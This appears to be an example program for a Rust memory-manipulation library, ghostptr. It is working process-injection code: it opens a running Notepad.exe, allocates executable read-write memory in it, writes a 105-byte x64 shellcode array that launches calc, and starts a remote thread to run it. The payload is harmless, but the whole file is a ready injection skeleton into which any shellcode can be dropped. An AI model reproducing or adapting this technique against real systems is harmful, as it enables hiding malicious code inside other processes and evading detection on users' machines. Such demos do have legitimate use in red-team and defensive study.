use core::ptr;
use ghostptr::{
    AllocationType, MemoryProtection, Process, ProcessAccess, RemoteProcess, ThreadAccess,
    ThreadCreationFlags,
};

// x64 shellcode to open calc
const SHELLCODE: [u8; 105] = [
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54,
    0x59, 0x48, 0x83, 0xec, 0x28, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76,
    0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x3, 0x57, 0x3c, 0x8b, 0x5c, 0x17,
    0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x1, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0xf, 0xb7, 0x2c, 0x17,
    0x8d, 0x52, 0x2, 0xad, 0x81, 0x3c, 0x7, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f,
    0x1c, 0x48, 0x1, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x1, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4,
    0x30, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3,
];

fn main() -> ghostptr::Result<()> {
    // open process
    let process = RemoteProcess::open_first_named(
        "Notepad.exe",
        ProcessAccess::VM_OPERATION
            | ProcessAccess::VM_READ
            | ProcessAccess::VM_WRITE
            | ProcessAccess::CREATE_THREAD,
    )?;

    // allocate memory for shellcode
    let allocation = process.alloc_mem(
        None,
        SHELLCODE.len(),
        AllocationType::RESERVE | AllocationType::COMMIT,
        MemoryProtection::EXECUTE_READWRITE,
    )?;

    // write shellcode to memory allocation
    process.write_mem(allocation.address, &SHELLCODE)?;

    // create thread in process to execute the shellcode
    let thread = process.create_thread(
        ThreadAccess::SYNCHRONIZE,
        allocation.address as _,
        ptr::null_mut(),
        ThreadCreationFlags::None,
    )?;

    // wait for the thread to be completed
    thread.wait(None, false)?;

    Ok(())
}
